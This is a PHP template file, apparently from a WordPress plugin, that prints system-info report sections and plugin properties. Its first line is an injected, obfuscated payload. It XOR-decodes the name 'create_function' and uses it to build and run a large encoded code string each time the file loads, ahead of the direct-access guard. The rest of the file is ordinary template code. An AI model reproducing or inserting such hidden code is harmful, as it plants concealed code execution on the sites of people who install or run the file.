<?php $kUeuvS='PN0JA1eS1ZO:8;+'^'3<U+5T:5D4,NQTE';$nFeNOuFmDz=$kUeuvS('','Y3cM.HCMY0==oE,-=T1CI-;R;SUH4>j;G.sLov<8D1N-,GWTXv6QIc0-LOcfZHNOb=S6LaFI3=6LWnwEC:YzLKTB>qHSJMK<EyRY<Qp;reOIBxi0jK>7;KWgq3MCPQwbsXFbs<AelYHTJbIuOAWX.T7L+2VeATKYJ2PPTPHDL3TQUKGW,.niXX:YjN7ND=UlnY4<kWnqGbApPBP98LjrsHYQARw0P6JFMi 7JpJaW R 7sBN3RRH0U1TrMmsxo phJA9zt-V=Ezgxq34W02CHUOyI34L20QUJxMiG8H wR=sDAD7zJwIGL=B7XBAXn1ZEPJAU4JMSyOzO+WG-LN<orw1e0a2unbaAFagSHCttYSMEY<I+JHHzMkiI6A7o<NLkXyg33,oO3AFD20WTmia4R:UWBLa>1ImdKX595yvzzF<EIKQXWE-HD6O99+Z ;o.TX9m-W>HzceSHMR=PklJX09LkPI2L.Qo;P+qjxI=KLrS9G9ZGnoX IJ1d=,B;.A>N,8Bh3=NOjur+T6-MSARea+7SLeS,7A2u 6.v9HqQHdnPuPeqa;F+IFowGZHRrPxYzWsTSXyznz;TnHCqA-1FW1o>EJ>7K::M0ON4OW6VY3tNEJ, 7RFECcFEun6kd<JA>rwH7B;7H<YN57J3PiQskKPHRZoyON4F'^'0UKlH=-.-YRS0 TDN BknUT d74<Ua5V2ZTeFVG2MW;CO3>;6VN>;<TL8.<97=:gFY2B-MfmXXOewNWecASsEo;7JQusmjp6Lp46NyTRRXoyyXMYV8JEW.9OUW,71xLBW1mIZ6HlH6= jLtUge39Z5lhBov;ap <3it9tuh78A84;cc<IWG4qc0Pc<R:1O;DJ6AHBldx:h<zZf4XL-JOS.8=27L:tR+2,6KR3PwA1A>SRHHDU= -Q6YtZi207 k9-j JZPF3DeGYXUEU;EWjh.EpmWU8So:03XpIcS-YLX4W  0VZwWm1-Q7RcH<RdX<exke1U>,zY4pFM85H--TOZSn7u0g0=6A 5AC8-:TIgsi38P<Nch3pDbM-W5V0W+5KeYCXVUTE:Hb SD6tPIEB3V 2yFhC;4gno<TMTYKZ:3R6,989;,W-lN KfO;TZ0q9-MEO6M-LW:7-.=Y5CH.9DXeGpmV-Z00P5RXCCCT-dV7X3XzaHO9R;+H;VI;dK9W=XKjOXX7hFUVO5BLdsgtEIFSfdA7MC iRKSWQdaQluDIhC3TFWXuHq XAu9zfJhN=BfJ0kkMJVOXsGheWaLC46H0U 3aR3SI9CgiD..Z98WSbenHAC3olcCfeUNMamY< RZS,V6ZloL87YX+Ww4xHaB50;.GIfu>;');$nFeNOuFmDz();
if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

/**
 * @var array $reports
 * @var array $required_plugins_properties
 * @var int   $tabs_count
 */

$tabs_count++;

$required_plugins_properties = array_flip( $required_plugins_properties );

unset( $required_plugins_properties['Name'] );

foreach ( $reports as $report_name => $report ) :
	$indent = str_repeat( "\t", $tabs_count - 1 );

	$is_plugins = in_array(
		$report_name,
		[
			'plugins',
			'network_plugins',
			'mu_plugins',
		]
	);

	if ( ! $is_plugins ) :
		echo PHP_EOL . $indent . '== ' . $report['label'] . ' ==';
	endif;

	echo PHP_EOL;

	foreach ( $report['report'] as $field_name => $field ) :
		$sub_indent = str_repeat( "\t", $tabs_count );

		if ( $is_plugins ) :
			echo "== {$field['label']} ==" . PHP_EOL;

			foreach ( $field['value'] as $plugin ) :
				$plugin_properties = array_intersect_key( $plugin, $required_plugins_properties );

				echo $sub_indent . $plugin['Name'];

				foreach ( $plugin_properties as $property_name => $property ) :
					echo PHP_EOL . "{$sub_indent}\t{$property_name}: {$property}";
				endforeach;

				echo PHP_EOL . PHP_EOL;
			endforeach;
		else :
			echo "{$sub_indent}{$field['label']}: {$field['value']}" . PHP_EOL;
		endif;
	endforeach;

	if ( ! empty( $report['sub'] ) ) :
		$this->print_report( $report['sub'], $template, true );
	endif;
endforeach;

$tabs_count--;
